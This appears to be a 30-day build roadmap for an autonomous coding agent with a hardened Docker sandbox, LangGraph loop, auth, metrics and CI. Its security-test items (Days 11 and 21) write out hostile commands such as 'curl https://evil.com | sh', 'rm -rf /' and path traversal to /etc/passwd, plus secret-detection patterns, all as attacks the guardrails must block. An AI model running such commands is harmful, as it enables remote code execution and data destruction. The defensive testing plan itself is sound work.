---
title: "Mini Devin — Complete Build Roadmap"
description: "Phase-by-phase engineering roadmap to build a full-stack autonomous coding agent using AsyncIO, FastAPI, Docker sandboxing, AST indexing, and LangGraph."
tags:
  - roadmap
  - coding-agent
  - devin
  - architecture
aliases:
  - Mini Devin Roadmap
  - CodingAgent Roadmap
---

# 30-Day Plan — Production-Grade (150 hours)

> [!NOTE]
> ~5 hrs/day. Push to 6h on Week 3 (agent loop) and Week 4 (hardening) — those are where time slips.

## Learning vs Production

| Learning version | Production version |
|---|---|
| Guardrails added at the end | Guardrails proven by a test that tries to break them |
| In-memory task state | Persisted (SQLite/Postgres) — crash-safe, resumable |
| Raw exceptions bubble up | Typed errors: `ToolError`, `ValidationError`, `TimeoutError` |
| No retry limit | Bounded retries + exponential backoff + circuit breaker |
| Open API, no auth | API-key/JWT auth + per-key rate limiting |
| No metrics | Prometheus-style metrics: duration, tokens, cost, pass/fail |
| `python main.py` | `docker-compose up` — one command, full stack |
| No CI | GitHub Actions: lint, type-check, tests, image build on every PR |
| Sandbox trusted by design | Sandbox escape tests written as actual pytest tests |
| Single edit attempt | Auto re-index after patches to prevent index drift |

> [!IMPORTANT]
> Out of scope past Day 30: multi-tenant RBAC, Kubernetes, human-in-the-loop UI, gVisor/Firecracker.

---

## Week 1 — Foundation

- [ ] **Day 1** — Repo scaffold: `uv`/`poetry`, pre-commit (`ruff` + `mypy`), `pydantic-settings` config, structured JSON logging. Implement `read_file`, `write_file`, `run_shell` with input validation and typed `ToolError` returns. Unit tests for all three tools including error paths.

- [ ] **Day 2** — Core reasoning loop: system prompt design + task → LLM picks tool → execute → feed result back. Log reasoning trajectories to evaluate decision quality early. Tool dispatch unit tests (mock LLM). Retry/backoff wrapper around LLM API calls. Token/cost tracker per call. Test on one real failing-test task.

- [ ] **Day 3** — FastAPI skeleton: routers (`/health`, `/readiness`, `/tasks`, `/ws`), OpenAPI docs at `/docs`, WebSocket endpoint, versioned Pydantic event schemas (`ThoughtEvent`, `ToolCallEvent`, `ToolOutputEvent`, `TaskCompleteEvent`, `ErrorEvent`).

- [ ] **Day 4** — Async worker: `asyncio.TaskGroup` + `asyncio.Queue`. Graceful shutdown — drain in-flight tasks on SIGTERM. UUID `task_id` threaded through every log line and WS event. Queue-full returns 503.

- [ ] **Day 5** — Persistent task store: `Task` model (SQLAlchemy async), Alembic migration, `GET /tasks/{id}` and `GET /tasks?status=...`. On startup, mark interrupted RUNNING tasks as FAILED.

- [ ] **Day 6** — Minimal frontend: single-page HTML/JS with event stream pane + terminal pane. WS integration tests (httpx + pytest-asyncio): submit task → assert correct event sequence → assert DB record matches.

- [ ] **Day 7** — Wire Day 2 agent loop into the Day 3–6 server. End-to-end integration test: POST task → WS streams events → task completes → DB record correct. Token costs stored in DB.

> [!TIP]
> Week 1 checkpoint: typed config, structured logs, persisted task state, tested WS flow.

---

## Week 2 — Sandbox (Proven, Not Just Built) + Code Search

- [ ] **Day 8** — Docker SDK `WorkspaceManager`: `create(repo_url, commit_sha)`, `destroy()`, `get()`. GitPython shallow clone. All Docker errors wrapped as typed `WorkspaceError` — nothing raw leaks to the API layer.

- [ ] **Day 9** — `execute_command(workspace_id, cmd, timeout_s)` async generator: yields `CommandOutputLine` structs. Cap total output at 1MB — emit `TRUNCATED` sentinel beyond that. Kill command and emit `TIMEOUT` sentinel if `timeout_s` exceeded.

- [ ] **Day 10** — Container hardening: `mem_limit`, `cpu_quota`, `pids_limit` (256), read-only fs except `/workspace`, network egress disabled by default (`network_mode: none`), run as non-root user.

- [ ] **Day 11** — Security tests (the step most builds skip):
  - Network escape: `curl https://8.8.8.8` inside container → must fail
  - Filesystem escape: `open('/etc/crontab', 'w')` → must get PermissionError
  - Fork bomb: killed by `pids_limit` within 5 seconds, host unaffected
  - Memory exhaustion: container OOM-killed, not the host
  - Path traversal: `path=../../etc/passwd` tool call → must return `ToolError`

- [ ] **Day 12** — tree-sitter AST indexer (Target language: Python): file tree, module imports, class/function extraction (name, args, line span, docstring). `get_symbol_definition(name)` and `list_file_structure(path)`. Tests against a committed Python fixture repo. *(Buffer risk point: allow extra time for grammar extraction).*

- [ ] **Day 13** — Embeddings + `chromadb`: chunk functions/classes from AST output, embed, store. `semantic_search(query, top_k=5)`. Hybrid search: exact match first, semantic fallback. Embedding cost logged per run.

- [ ] **Day 14** — Wire sandbox + indexer into the agent loop. Integration test: submit task → workspace created → code indexed → agent navigates via search → pytest runs in sandbox → result returned. All Day 11 security tests still pass.

> [!TIP]
> Week 2 checkpoint: sandbox with passing security tests, structural + semantic search working.

---

## Week 3 — LangGraph Loop with Bounded Failure Modes

- [ ] **Day 15** — LangGraph typed `AgentState` schema (`task_id`, `plan`, `current_step`, `tool_history`, `reflection_history`, `retry_count`, `status`). **Context Window Management**: sliding window / history trimming strategy for `tool_history` to prevent blowing context limits on long runs. Planning Node with structured-output Pydantic validation. Retry-on-malformed-output (max 3 retries → `failed` state). SQLite-backed checkpoint persistence. *(Buffer risk point: state schema + checkpointing setup).*

- [ ] **Day 16** — Execution Node: LLM selects tool via `ToolCall(tool_name, args)` structured output. Validate args against tool schema before running. All errors populate `AgentState.last_error` as typed `ToolError(tool_name, code, message)` — never swallowed. Tool results stored in `tool_history`.

- [ ] **Day 17** — Reflection Node: parse pytest output into `TestResult(passed, failed, errors, summary)`. Bounded retry: `retry_count >= MAX_RETRIES` → `failed` state with readable failure report. Exponential backoff (`2^retry` seconds) between retries. Circuit breaker: 3 consecutive API errors → open circuit, fail task with `CircuitOpenError`.

- [ ] **Day 18** — `apply_patch` tool & auto re-indexing: parse unified diff → dry-run validate → apply to disk. **Incremental Re-indexing**: automatically re-parse AST + refresh embeddings for modified files post-patch to prevent search index drift. Reject invalid patches with typed `PatchError(reason, context)`.

- [ ] **Day 19** — Per-task token/cost budget: configurable `max_tokens` and `max_cost_usd`. Check before every LLM call — if budget exceeded, emit `BudgetExceededEvent`, write partial result to DB, transition to `failed` with `reason: budget_exceeded`. Expose `tokens_used`, `cost_usd`, `budget_remaining_pct` in task status API.

- [ ] **Day 20** — End-to-end on 2 real bug-fix tasks (real GitHub repos, pre-existing failing tests). Measure pass/fail, retry count, tokens, wall-clock time. Every bug found during testing → write a regression test before fixing. *(Buffer risk point: real repo test suite friction).*

- [ ] **Day 21** — Guardrails with proof (each must have a test that tries the attack):
  - Path traversal: `../../etc/passwd` and `/workspace/../etc/passwd` → `ToolError`
  - Dangerous commands: `rm -rf /` and `curl https://evil.com | sh` → `ToolError`
  - Secrets scanner: scan file writes and command output for `AKIA*`, `sk-*`, PEM headers → redact + log `SecurityEvent`
  - Prompt injection: tool output wrapped in untrusted-data delimiter before being passed to LLM

> [!TIP]
> Week 3 checkpoint: closed agent loop, tested guardrails, bounded failure modes.

---

## Week 4 — Hardening Sprint

- [ ] **Day 22** — Auth: API key validation as FastAPI `Depends(require_api_key)` on all `/tasks` and `/ws` routes. Per-key rate limiting — `429 Too Many Requests` + `Retry-After` when exceeded. Integration tests: 401 (no key), 403 (wrong key), 429 (rate limit hit), 200 (valid key).

- [ ] **Day 23** — Prometheus metrics at `GET /metrics`: `agent_tasks_total{status}`, `agent_task_duration_seconds` (histogram, p50/p95/p99), `agent_tool_calls_total{tool_name,status}`, `agent_tokens_used_total{model}`, `agent_cost_usd_total{model}`, `agent_active_tasks` (gauge). Every log line has `task_id`, `tool_name`, `duration_ms`, `status`.

- [ ] **Day 24** — CI pipeline (`.github/workflows/ci.yml`): `ruff check`, `ruff format --check`, `mypy --strict`, `pytest` (unit + integration + security tests), Docker image build. Fail PR if coverage drops below threshold. CI badge + coverage badge in README. *(Buffer risk point: mypy strict type backlog).*

- [ ] **Day 25** — Containerize the app: multi-stage Dockerfile (builder → minimal runtime), non-root user, all config from env. `docker-compose.yml`: `app` (FastAPI) + `db` (Postgres) + sandbox runtime. `docker-compose up` from a clean checkout → `POST /tasks` works immediately.

- [ ] **Day 26** — Concurrency/load test: fire 10 tasks simultaneously. Confirm rate limiting fires correctly, DB handles concurrent writes without corruption, containers get correct resource limits under load. Every load-test failure → regression test before fixing.

- [ ] **Day 27** — Eval suite: 3–5 real GitHub issues wired as a scheduled CI job (nightly, not every PR). Measures pass rate, avg tokens/cost, avg time-to-complete. Langfuse or LangSmith tracing: every LLM call traced with task_id, tokens, latency. Alert if pass rate drops below baseline.

- [ ] **Day 28** — Security review pass: re-run Day 11 sandbox tests, re-run Day 21 guardrail tests. Run a task that touches a fake `.env` with fake secrets — assert nothing appears in logs or DB. Docker image audit: non-root, no unnecessary packages, no baked-in secrets. `trivy` scan — zero critical CVEs.

> [!TIP]
> Week 4 checkpoint: deployable, observable, rate-limited, tested system.

---

## Days 29–30 — Final Integration & Demo

- [ ] **Day 29** — Architecture README: Mermaid system diagram (client → FastAPI → LangGraph → sandbox → DB), component descriptions, data flow, tech stack table. Runbook: deploy steps, key rotation, how to read `/metrics`, how to filter logs by `task_id`, common failure modes. Review `/docs` — all endpoints and schemas described with examples.

- [ ] **Day 30** — Fresh-clone deploy: clone into a clean directory, follow README exactly, `docker-compose up`, run eval suite. Record a demo (GIF or video): submit task → live streaming events → test suite passes. Fix anything that breaks during the fresh-clone. Tag `v1.0.0`.

---

## Final Checklist

### Foundation
- [ ] Typed config via `pydantic-settings` (zero hardcoded secrets)
- [ ] Structured JSON logging with `task_id` on every line
- [ ] System prompt design & trajectory logging
- [ ] Tool dispatch tested with mocked LLM
- [ ] Retry/backoff on LLM API calls
- [ ] Token/cost tracked and stored per task
- [ ] FastAPI: health, readiness, WS, OpenAPI
- [ ] Graceful SIGTERM shutdown (drain in-flight)
- [ ] SQLAlchemy + Alembic task persistence
- [ ] WS integration test: task → events → DB record

### Sandbox
- [ ] `WorkspaceManager` with typed `WorkspaceError`
- [ ] `execute_command` async generator: output cap + timeout
- [ ] Container hardening: mem, cpu, pids, read-only fs, no network
- [ ] Security tests: network, fs escape, fork bomb, OOM, path traversal — all passing

### Code Intelligence
- [ ] tree-sitter: symbol extraction, file structure, definition lookup (Python target)
- [ ] Semantic search via chromadb: natural-language code queries
- [ ] Hybrid search: exact match preferred, semantic fallback
- [ ] Auto re-indexing after `apply_patch` modifications

### Agent Loop
- [ ] LangGraph typed state with checkpoint persistence
- [ ] Context window management: history trimming / sliding window in `AgentState`
- [ ] Planning Node: structured output + retry-on-malformed
- [ ] Execution Node: typed error taxonomy, no swallowed exceptions
- [ ] Reflection Node: bounded retries + circuit breaker
- [ ] `apply_patch`: dry-run validation before write + auto re-index
- [ ] Token/cost budget: hard stop + partial result
- [ ] Guardrails tested: path traversal, dangerous cmds, secrets, prompt injection

### Hardening
- [ ] API key auth + per-key rate limiting (429)
- [ ] Prometheus `/metrics` with p99 latency histogram
- [ ] CI: lint, type-check, tests, Docker build on every PR
- [ ] Multi-stage Dockerfile + docker-compose: one-command start
- [ ] Concurrency load test: 10 simultaneous tasks
- [ ] Eval suite: nightly CI, pass-rate report
- [ ] Full security review: guardrail tests, no secrets in logs/DB, non-root image, trivy clean

### Portfolio
- [ ] README with Mermaid architecture diagram
- [ ] Runbook: deploy, key rotation, metrics, logs, failures
- [ ] OpenAPI: all endpoints and schemas documented
- [ ] Demo GIF/video in README
- [ ] `v1.0.0` tagged
- [ ] Fresh-clone verified end-to-end

---

## High-Risk Points & Fallback Plan

### Timeline Risk Points
- **Day 12** (tree-sitter setup & extraction): Expect setup friction; restrict scope strictly to Python source files.
- **Day 15** (LangGraph state & checkpointing): Allocate extra time if using LangGraph for the first time.
- **Day 20** (Real-repo bug-fix execution): Live test suites are noisy — budget time for environment quirks.
- **Day 24** (CI mypy strictness): Address type annotations incrementally starting Day 1 to avoid backlog.

### Fallback Order (If Behind Schedule)
1. Skip Day 26 load test — note as a known gap in README
2. Trim eval suite from 5 to 3 issues
3. Skip Langfuse/LangSmith — structured logs still give debuggability
4. Defer semantic search (Day 13) — exact-match symbol search alone still enables code navigation

> [!CAUTION]
> Do NOT cut: security tests (Days 11, 21, 28), auto re-indexing (Day 18), context window trimming (Day 15), or bounded-retry/circuit-breaker (Day 17). Those are what separate "production grade" from "works on my machine."

---

#coding-agent #python #llm #docker #langgraph #fastapi #systems #portfolio #30-day
